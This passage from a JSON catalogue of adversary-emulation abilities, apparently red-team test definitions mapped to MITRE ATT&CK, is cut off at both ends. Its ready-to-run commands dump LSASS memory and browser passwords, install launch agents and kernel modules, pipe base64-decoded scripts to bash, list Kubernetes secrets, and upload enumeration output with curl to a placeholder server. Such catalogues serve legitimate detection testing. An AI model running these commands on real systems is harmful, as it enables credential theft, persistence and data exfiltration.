Dumping: LSASS Memory", "ability_id": "03526668cc55b6544244b107feadaf22", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "LSASS read with pypykatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe browsers", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "6c8c90245d72cdf28c3cfeb2307f3e9e", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "LaZagne - Credentials from Browser", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -R /tmp/LaZagne; rm -f /tmp/firefox_password.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "927d62f0c59f2a0832d95562bc3e84e2", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "LaZagne.py - Dump Credentials from Firefox Browser", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a plist and execute it\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["a42d6f_atomicredteam_T1543_001.plist"], "parsers": [], "cleanup": ["sudo launchctl unload ~/Library/LaunchAgents/com.atomicredteam.plist; sudo rm ~/Library/LaunchAgents/com.atomicredteam.plist"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp a42d6f_atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist; sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Launch Agent", "ability_id": "23246f1b042898be6b168efedcb36fd4", "technique_id": "T1543.001", "tactic": "multiple", "requirements": [], "name": "Launch Agent", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize LaunchDaemon to launch `Hello World`\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["f5fe80_atomicredteam_T1543_004.plist"], "parsers": [], "cleanup": ["sudo launchctl unload /Library/LaunchDaemons/com.atomicredteam.plist; sudo rm /Library/LaunchDaemons/com.atomicredteam.plist; sudo rm /tmp/T1543_004_atomicredteam.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo cp f5fe80_atomicredteam_T1543_004.plist /Library/LaunchDaemons/com.atomicredteam.plist; sudo launchctl load -w /Library/LaunchDaemons/com.atomicredteam.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Launch Daemon", "ability_id": "506074e8dd220bcbee66150349292c00", "technique_id": "T1543.004", "tactic": "multiple", "requirements": [], "name": "Launch Daemon", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process PathToAtomicsFolder\\T1083\\bin\\DirLister.exe; Start-Sleep -Second 4; Stop-Process -Name \"DirLister\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "e658d2552728a97b1a3c70838176c94d", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "Launch DirLister Executable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process $env:TEMP\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe -Argument \"-U:T -P:E cmd\"; Start-Sleep -Second 5; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Token Impersonation/Theft", "ability_id": "290915ea4ec9fae461442bd89d9d8098", "technique_id": "T1134.001", "tactic": "multiple", "requirements": [], "name": "Launch NSudo Executable", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize launchctl\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["launchctl remove evil"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "launchctl submit -l evil -- /System/Applications/Calculator.app/Contents/MacOS/Calculator", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Services: Launchctl", "ability_id": "58193baa89a80d5bcd0276e89b3f76c6", "technique_id": "T1569.001", "tactic": "execution", "requirements": [], "name": "Launchctl", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "6a411cadf7c87edcb445422ce6785550", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Launches an executable using Rundll32 and pcwutl.dll", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a text file for the user to find", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "echo \"proof that this machine was hacked.\" > message.txt", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"proof that this machine was hacked.\" > message.txt", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Defacement", "ability_id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9", "technique_id": "T1491", "tactic": "impact", "requirements": [], "name": "Leave note", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dump lsass for later use with mimikatz", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Leverage Procdump for lsass memory", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf PathToAtomicsFolder/T1059.004/src/LinEnum.sh"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh; bash PathToAtomicsFolder/T1059.004/src/LinEnum.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "c157df565590c06f433bc25a3ac5a8e9", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "LinEnum tool execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses the insmod command to load a kernel module for Linux.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rmmod T1547006; [ -f /tmp/T1547.006/safe_to_delete ] && rm -rf /tmp/T1547.006"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo insmod /tmp/T1547.006/T1547006.ko", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions", "ability_id": "74117090d6c33ade24c37b5d5b804681", "technique_id": "T1547.006", "tactic": "multiple", "requirements": [], "name": "Linux - Load Kernel Module via insmod", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Deobfuscate/Decode Files or Information", "ability_id": "d38cba2905e62b4c1a7e5c88137ce485", "technique_id": "T1140", "tactic": "defense-evasion", "requirements": [], "name": "Linux Base64 Encoded Shebang in CLI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "curl -sO", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "3d331538a65d7ebee865a1906f729bad", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Linux Download File and Run", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download and execute LinEnum.sh", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm ./LinEnum.sh;\nrm /tmp/exfil.txt;"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "46098c66-8d9a-4d23-8a95-dd5021c385ae", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Linux Enumeration & Privilege Escalation Discovery Script", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "lsmod; kmod list; grep vmw /proc/modules", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "d7456d8122cfc76421fc4806934fc448", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Linux List Kernel Modules", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi; if [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi; if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi; if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi; if [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi; if [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "c87a8f2fdbb1714c8674acd1737ca0a5", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Linux VM Check via Hardware", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"; sudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"; sudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"; sudo lsmod | grep -i \"virtio_pci\\|virtio_net\"; sudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "5c010088084e0d6cc72f2632b021dc4d", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Linux VM Check via Kernel Modules", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.\n[More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).\n\nThis test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "kubectl get secrets --all-namespaces", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Kubernetes List Secrets", "ability_id": "7fa328192c9a6815c2ea93fe54fa0059", "technique_id": "T1552.007", "tactic": "credential-access", "requirements": [], "name": "List All Secrets", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "List contents of current directory", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ls", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ls", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "dir", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "List Directory", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "where /R C:\\Users\\ Bookmarks", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "ee12056a74be07c381877d47531429b6", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "abc25aecd2ed0524af31e79add29cc43", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Google Chrome / Opera Bookmarks on Windows with powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1217-Chrome.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/T1217-Chrome.txt \\; cat /tmp/T1217-Chrome.txt 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "0142dca15d1eaabd3333bae002d1e15a", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Google Chrome Bookmark JSON Files on macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "dir /s /b %USERPROFILE%\\Favorites", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "69bbe2183fa09c00ccaac62d48e214f8", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Internet Explorer Bookmarks using the command prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1217-Firefox.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\; cat /tmp/T1217-Firefox.txt 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "90cac81169ebb96b4bfdc0c17a507b67", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Mozilla Firefox Bookmark Database Files on Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1217_Firefox.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/T1217_Firefox.txt \\; cat /tmp/T1217_Firefox.txt 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "7f1915b1e29069b2d91dfabf4177f13c", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Mozilla Firefox Bookmark Database Files on macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "where /R C:\\Users\\ places.sqlite", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "f7a0f7d704aa52a764d9d1bee81e65d6", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "List Mozilla Firefox bookmarks on Windows with command prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System Info\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1082.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "uname -a >> /tmp/T1082.txt; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   ; if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi; uptime >> /tmp/T1082.txt; cat /tmp/T1082.txt 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1082.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "uname -a >> /tmp/T1082.txt; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   ; if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi; uptime >> /tmp/T1082.txt; cat /tmp/T1082.txt 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "278b4cdafa0ddc90b98bc2ce8df2c05f", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "List OS Information", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["88a14d_top-128.txt"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -ErrorAction ignore \"$env:USERPROFILE\\Desktop\\open-ports.txt\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ports = Get-content 88a14d_top-128.txt; $file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"; $totalopen = 0; $totalports = 0; New-Item $file -Force; foreach ($port in $ports) {;     $test = new-object system.Net.Sockets.TcpClient;     $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null);     $wait.asyncwaithandle.waitone(250, $false) | Out-Null;     $totalports++ | Out-Null;     if ($test.Connected) {;         $result = \"$port open\" ;         Write-Host -ForegroundColor Green $result;         $result | Out-File -Encoding ASCII -append $file;         $totalopen++ | Out-Null;     };     else {;         $result = \"$port closed\" ;         Write-Host -ForegroundColor Red $result;         $totalclosed++ | Out-Null;         $result | Out-File -Encoding ASCII -append $file;     }; }; $results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"; $results | Out-File -Encoding ASCII -append $file; Write-Host $results", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "b71736aec5f0386d81a9d711a948e86b", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "List Open Egress Ports", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the 